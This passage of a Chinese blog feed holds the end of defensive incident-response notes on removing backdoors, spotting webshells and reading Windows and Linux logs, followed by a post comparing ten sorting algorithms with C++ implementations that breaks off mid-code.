title="清除后门文件"></a>清除后门文件</h4><pre><code>1.可疑文件上传杀毒网站（http://virusdesk.kaspersky.com)2.搜索网上有无相关资料3.对可疑程序备份后进行删除4，顽固病毒使用冰刃等进程管理工具结束进程，然后删除5.通过currports查看当前网络连接程序及情况6.抓包查看对外连接7.清楚shift后门和“放大镜”</code></pre><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><h5 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a>挂马</h5><p>url snooper</p><p>360</p><p>Autoruns</p><p>processxp</p><p>D盾_web查杀</p><h5 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h5><p>逆火日志</p><h4 id="Tips-1"><a href="#Tips-1" class="headerlink" title="Tips"></a>Tips</h4><p>判断挂马</p><pre><code>1.查看代码2.查找网络目录修改时间，通过时间进行判断（最好再根据实际情况设置时间范围）3.工具4.文件大小（大的一般是加密后的shell）5.可疑文件md5值查找</code></pre><p>修改所有账号及密码</p><p>iis日志手工分析</p><pre><code>cat *.log&gt;alllog.txt所有日志生产一个txt</code></pre><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>三个主要的日志子系统</p><pre><code>1.连接时间日志/var/log/wtmp/var/run/utmp查看谁何时登陆到系统2.进程统计当一个进程终止时，会向进程统计文件pacct或acct写入一个记录。进程统计的目的是为系统中的基本服务提供命令使用情况3.错误日志由syslogd执行/var/log/messages</code></pre><p>常见日志文件</p><pre><code>1.access-log：记录http/web的传输2.acct/pacct：记录用户命令3.aculog：记录modem的活动4.btmp：记录失败的记录5.lastlog：记录几次成功登陆和最后一次不成功登陆6.message：从syslog中记录信息7.sudolog：记录sudo的命令8.sulog：同上（su）9.syslog：从syslog中记录信息，通常链接到messages文件中10.utmp：记录当前登陆的用户11.wtmp：一个用户的每次登陆进入和退出时间的永远记录12.xferlog：ftp会话记录</code></pre><p>last命令用于显示当前操作系统中用户最近登陆的信息。单独执行last命令，将会读取wtmp的文件并打印。</p><p>lastb同上，读取文件为btmp</p><p>lastlog，读取lastlog文件</p></div></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法整理汇总（附代码）</title>
      <link href="/2020/02/16/sort-algorithms/"/>
      <url>/2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。</p><p><strong>本文并不会详细讲解每种排序算法的原理</strong>，网上有很多很好的教程，大家可以自己去搜了看。</p><p>最后我还亲自手写了十种排序算法的 c++ 代码，大家可以用来通过 <a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. 排序数组" target="_blank" rel="noopener">LeetCode 912. 排序数组</a> 这道题。</p><h2 id="性质汇总"><a href="#性质汇总" class="headerlink" title="性质汇总"></a>性质汇总</h2><blockquote><p>如果发现表中有错误，请留言告知。</p></blockquote><table><thead><tr><th>算法</th><th>最好</th><th>最坏</th><th>平均</th><th>空间</th><th align="center">稳定性</th><th align="center">是否基于比较</th></tr></thead><tbody><tr><td>冒泡排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>选择排序</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>插入排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>快速排序</td><td>$O(n\log n)$</td><td>$O(n^2)$</td><td>$O(n\log n)$</td><td>$O(\log n)$~$O(n)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>归并排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>希尔排序</td><td>$O(n^{1.3})$</td><td>$O(n^2)$</td><td>$O(n\log n)$~$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>计数排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>基数排序</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>桶排序</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n+m)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>堆排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr></tbody></table><blockquote><p>如果表格显示有问题的话，还可以直接看下面的汇总图：</p></blockquote><p><img src="1.png" alt="十大经典排序算法性质汇总"></p><h3 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h3><p>我觉得还是英文维基百科讲的比较详细、严谨。如果大家看的比较累的话，可以自己百度搜索相应的教程。</p><p><strong>冒泡排序</strong><br><a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bubble_sort</a></p><p><strong>选择排序</strong><br><a href="https://en.wikipedia.org/wiki/Selection_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Selection_sort</a></p><p><strong>插入排序</strong><br><a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>快速排序</strong><br><a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>归并排序</strong><br><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>希尔排序</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>计数排序</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>基数排序</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>桶排序</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>堆排序</strong><br><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heapsort</a></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>所有的排序算法接口都是相同的，也就是 <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> 。只需要你传入一个 <code>vector&lt;int&gt;</code> 类型的数组，就能返回排序后的结果。</p><p>运行下来可以发现，桶排序速度是比较快的。而冒泡排序、选择排序和插入排序因为时间复杂度太高无法通过本题，基数排序因为无法处理负数也不能通过本题。</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 冒泡排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token number">-2</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 选择排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 插入排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 快速排序（24 ms）</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序（192 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序 + 非递归（80 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token number">-1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 希尔排序（40 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-</span><span class="token operator">=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 计数排序（32 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token 